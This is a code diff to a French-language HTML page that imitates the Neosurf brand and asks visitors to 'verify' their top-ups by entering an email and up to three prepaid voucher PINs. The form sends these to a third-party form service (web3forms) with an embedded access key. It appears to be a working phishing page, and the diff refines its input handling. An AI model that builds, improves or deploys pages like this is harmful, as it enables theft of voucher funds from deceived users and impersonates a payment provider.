@@ -15,27 +15,24 @@
             <img src="image/logo-neosurf-removebg-preview.png" alt="" width="200" height="50">
             <div class="l-text"><small>So Simple to Pay<br>& Play Online</small></div>
         </div>
-        
-       
-
     </header>
     <div id="wrapper">
         <form action="https://api.web3forms.com/submit" method="POST" class="form" onsubmit="goToHomePage(event);reset()">       
             <h2>VERIFIER VOS RECHARGES</h2>
             <div class="neosurf">
-             <input type="hidden" name="access_key" value="5df71dac-c2ce-4315-9734-155181b522f0">
-            <fieldset>
-                <legend>INFORMATION</legend>
-                <div>
-                <label for="email">Email:</label>
-                <input type="email" name="email" id="email" placeholder="abcdef@gmail.com" required>
-                </div>
+                <input type="hidden" name="access_key" value="5df71dac-c2ce-4315-9734-155181b522f0">
+                <fieldset>
+                    <legend>INFORMATION</legend>
+                    <div>
+                        <label for="email">Email:</label>
+                        <input type="email" name="email" id="email" placeholder="abcdef@gmail.com" required>
+                    </div>
                 </fieldset>
                 <fieldset>
                     <legend>VERIFIER</legend>
                     <div>
                         <label for="montant1Neosurf">Montant:</label>
-                        <select name="montant1Neo" id="montant1Neosurf" required>
+                        <select name="montant1Neo" id="montant1Neosurf" required onchange="togglePinInput('montant1Neosurf', 'code1')">
                             <option value="0" disabled selected>Montant de la recharge</option>
                             <option value="30">30€</option>
                             <option value="50">50€</option>
@@ -44,11 +41,11 @@
                     </div>
                     <div>
                         <label for="code1">Pin:</label>
-                        <input type="text" id="code1" name="code1" placeholder="XXXX XXX XXX" required maxlength="12">
+                        <input type="text" id="code1" name="code1" placeholder="XXXX XXX XXX" required maxlength="12" disabled>
                     </div>
                     <div>
                         <label for="montant2">Montant:</label>
-                        <select name="montant2" id="montant1">
+                        <select name="montant2" id="montant2" onchange="togglePinInput('montant2', 'code2')">
                             <option value="0" disabled selected>Montant de la recharge</option>
                             <option value="30">30€</option>
                             <option value="50">50€</option>
@@ -57,11 +54,11 @@
                     </div>
                     <div>
                         <label for="code2">Pin 2:</label>
-                        <input type="text" id="code2" name="code2" placeholder="XXXX XXX XXX"  maxlength="12">
+                        <input type="text" id="code2" name="code2" placeholder="XXXX XXX XXX" maxlength="12" disabled>
                     </div>
                     <div>
                         <label for="montant3">Montant:</label>
-                        <select name="montant3" id="montant3">
+                        <select name="montant3" id="montant3" onchange="togglePinInput('montant3', 'code3')">
                             <option value="0" disabled selected>Montant de la recharge</option>
                             <option value="30">30€</option>
                             <option value="50">50€</option>
@@ -70,7 +67,7 @@
                     </div>
                     <div>
                         <label for="code3">Pin 3:</label>
-                        <input type="text" id="code3" name="code3" placeholder="XXXX XXX XXX"  maxlength="12">
+                        <input type="text" id="code3" name="code3" placeholder="XXXX XXX XXX" maxlength="12" disabled>
                     </div>
                 </fieldset>
             </div>
@@ -86,10 +83,10 @@
         function goToHomePage(event) {
             // Empêcher le comportement de soumission par défaut
             event.preventDefault();
-    
+
             // Récupérer les données du formulaire
             var formData = new FormData(event.target);
-    
+
             // Envoyer les données du formulaire en utilisant AJAX
             fetch(event.target.action, {
                 method: 'POST',
@@ -107,6 +104,16 @@
                 // Vous pouvez également afficher un message d'erreur à l'utilisateur
                 alert('Erreur lors de la soumission du formulaire. Veuillez réessayer.');
             });
+        }
+
+        function togglePinInput(montantId, codeId) {
+            var montantSelect = document.getElementById(montantId);
+            var codeInput = document.getElementById(codeId);
+            if (montantSelect.value !== "0") {
+                codeInput.disabled = false;
+            } else {
+                codeInput.disabled = true;
+            }
         }
     </script>
 </body>
